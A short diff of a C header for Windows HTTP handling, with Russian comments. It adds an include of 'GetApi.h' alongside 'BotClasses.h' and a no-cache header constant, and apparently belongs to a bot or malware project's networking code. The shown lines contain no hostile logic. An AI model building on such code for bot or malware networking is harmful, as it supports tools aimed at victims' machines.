@@ -15,6 +15,7 @@
 #include <windows.h>
 #include <WinSock.h>
 
+#include "GetApi.h"
 #include "BotClasses.h"
 
 // Названия основных методов HTTP запроса
@@ -69,6 +70,7 @@ const PCHAR LineBreak = "\r\n";
 const PCHAR LineBreak2 = "\r\n\r\n";
 const PCHAR ValueDelimeter = ": ";
 const PCHAR ValueChunked = "chunked";
+const PCHAR ValueNoCacheDocument = "no-store, no-cache, must-revalidate";
 const PCHAR URLValueDelimeter = "&";
 
 const PCHAR FormDataURLEncoded = "application/x-www-form-urlencoded";
@@ -422,8 +424,6 @@ typedef struct THTTPSessionInfo{
 	PCHAR UserAgent;    // Имя браузера
 	PCHAR URL;          // Адрес загружаемого ресурса
 } *PHTTPSessionInfo;
-
-
 
 
 //---------------------------------------------------------------------------
